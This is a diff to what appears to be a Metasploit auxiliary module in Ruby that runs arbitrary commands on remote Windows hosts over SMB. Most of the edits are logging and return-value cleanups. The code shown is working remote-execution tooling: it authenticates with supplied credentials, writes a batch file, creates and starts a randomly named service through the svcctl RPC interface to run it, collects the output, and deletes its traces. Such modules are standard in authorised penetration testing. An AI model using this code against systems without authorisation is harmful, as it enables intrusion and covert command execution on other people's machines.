@@ -50,6 +50,10 @@ class Metasploit3 < Msf::Auxiliary
 		deregister_options('RHOST')
 	end
 
+	def peer
+		return "#{rhost}:#{rport}"
+	end
+
 	# This is the main controle method
 	def run_host(ip)
 		text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
@@ -61,11 +65,11 @@ class Metasploit3 < Msf::Auxiliary
 			begin
 				smb_login
 			rescue StandardError => autherror
-				print_error("Unable to authenticate with given credentials: #{autherror}")
+				print_error("#{peer} - Unable to authenticate with given credentials: #{autherror}")
 				return
 			end
 			if execute_command(ip, text, bat)
-				o = get_output(smbshare, ip, text)
+				get_output(smbshare, ip, text)
 			end
 			cleanup_after(smbshare, ip, text, bat)
 			disconnect
@@ -77,32 +81,32 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			#Try and execute the provided command
 			execute = "%COMSPEC% /C echo #{datastore['COMMAND']} ^> %SYSTEMDRIVE%#{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
-			print_status("Executing your command on host: #{ip}")
-			psexec(execute)
-			return true
+			print_status("#{peer} - Executing the command...")
+			return psexec(execute)
 		rescue StandardError => exec_command_cerror
-			print_error("#{ip} - Unable to execute specified command: #{exec_command_error}")
-			return false	
+			print_error("#{peer} - Unable to execute specified command: #{exec_command_error}")
+			return false
 		end
 	end
 
 	# Retrive output from command
 	def get_output(smbshare, ip, file)
 		begin
+			print_status("#{peer} - Getting the command output...")
 			simple.connect("\\\\#{ip}\\#{smbshare}")
 			outfile = simple.open(file, 'ro')
 			output = outfile.read
 			outfile.close
 			simple.disconnect("\\\\#{ip}\\#{smbshare}")
 			if output.empty?
-				print_status("Command finished with no output")
+				print_status("#{peer} - Command finished with no output")
 				return
 			end
-			print_good("Command completed successfuly! Output from: #{ip}\r\n#{output}")
-			return output
+			print_good("#{peer} - Command completed successfuly! Output:\r\n#{output}")
+			return
 		rescue StandardError => output_error
-			print_error("#{ip} - Error getting command output. #{output_error.class}. #{output_error}.")
-			return nil
+			print_error("#{peer} - Error getting command output. #{output_error.class}. #{output_error}.")
+			return
 		end
 	end
 
@@ -111,15 +115,16 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			# Try and do cleanup command
 			cleanup = "%COMSPEC% /C del %SYSTEMDRIVE%#{text} & del #{bat}"
-			print_status("Executing cleanup on host: #{ip}")
+			print_status("#{peer} - Executing cleanup...")
 			psexec(cleanup)
 			if !check_cleanup(smbshare, ip, text)
-				print_error("#{ip} - Unable to cleanup.  Need to manually remove #{text} and #{bat} from the target.")
+				print_error("#{peer} - Unable to cleanup. Maybe you'll need to manually remove #{text} and #{bat} from the target.")
 			else
-				print_status("#{ip} - Cleanup was successful")
+				print_status("#{peer} - Cleanup was successful")
 			end
 		rescue StandardError => cleanuperror
-			print_error("Unable to processes cleanup commands: #{cleanuperror}")
+			print_error("#{peer} - Unable to processes cleanup commands. Error: #{cleanuperror}")
+			print_error("#{peer} - Maybe you'll need to manually remove #{text} and #{bat} from the target")
 			return cleanuperror
 		end
 	end
@@ -147,11 +152,11 @@ class Metasploit3 < Msf::Auxiliary
 		simple.connect("IPC$")
 
 		handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
-		vprint_status("Binding to #{handle} ...")
+		vprint_status("#{peer} - Binding to #{handle} ...")
 		dcerpc_bind(handle)
-		vprint_status("Bound to #{handle} ...")
+		vprint_status("#{peer} - Bound to #{handle} ...")
 
-		vprint_status("Obtaining a service manager handle...")
+		vprint_status("#{peer} - Obtaining a service manager handle...")
 		scm_handle = nil
 		stubdata =
 			NDR.uwstring("\\\\#{rhost}") +
@@ -163,8 +168,8 @@ class Metasploit3 < Msf::Auxiliary
 				scm_handle = dcerpc.last_response.stub_data[0,20]
 			end
 		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
+			print_error("#{peer} - Error: #{e}")
+			return false
 		end
 
 		servicename = Rex::Text.rand_text_alpha(11)
@@ -191,24 +196,24 @@ class Metasploit3 < Msf::Auxiliary
 			NDR.long(0) + # Password
 			NDR.long(0)  # Password
 		begin
-			vprint_status("Creating the service...")
+			vprint_status("#{peer} - Creating the service...")
 			response = dcerpc.call(0x0c, stubdata)
 			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
 				svc_handle = dcerpc.last_response.stub_data[0,20]
 				svc_status = dcerpc.last_response.stub_data[24,4]
 			end
 		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
+			print_error("#{peer} - Error: #{e}")
+			return false
 		end
 
-		vprint_status("Closing service handle...")
+		vprint_status("#{peer} - Closing service handle...")
 		begin
 			response = dcerpc.call(0x0, svc_handle)
 		rescue ::Exception
 		end
 
-		vprint_status("Opening service...")
+		vprint_status("#{peer} - Opening service...")
 		begin
 			stubdata =
 				scm_handle +
@@ -220,11 +225,11 @@ class Metasploit3 < Msf::Auxiliary
 				svc_handle = dcerpc.last_response.stub_data[0,20]
 			end
 		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
+			print_error("#{peer} - Error: #{e}")
+			return false
 		end
 
-		vprint_status("Starting the service...")
+		vprint_status("#{peer} - Starting the service...")
 		stubdata =
 			svc_handle +
 			NDR.long(0) +
@@ -234,11 +239,11 @@ class Metasploit3 < Msf::Auxiliary
 			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
 			end
 		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
+			print_error("#{peer} - Error: #{e}")
+			return false
 		end
 
-		vprint_status("Removing the service...")
+		vprint_status("#{peer} - Removing the service...")
 		stubdata =
 			svc_handle
 		begin
@@ -246,18 +251,19 @@ class Metasploit3 < Msf::Auxiliary
 			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
 			end
 		rescue ::Exception => e
-			print_error("Error: #{e}")
+			print_error("#{peer} - Error: #{e}")
 		end
 
-		vprint_status("Closing service handle...")
+		vprint_status("#{peer} - Closing service handle...")
 		begin
 			response = dcerpc.call(0x0, svc_handle)
 		rescue ::Exception => e
-			print_error("Error: #{e}")
+			print_error("#{peer} - Error: #{e}")
 		end
 
 		select(nil, nil, nil, 1.0)
 		simple.disconnect("IPC$")
+		return true
 	end
 
 end
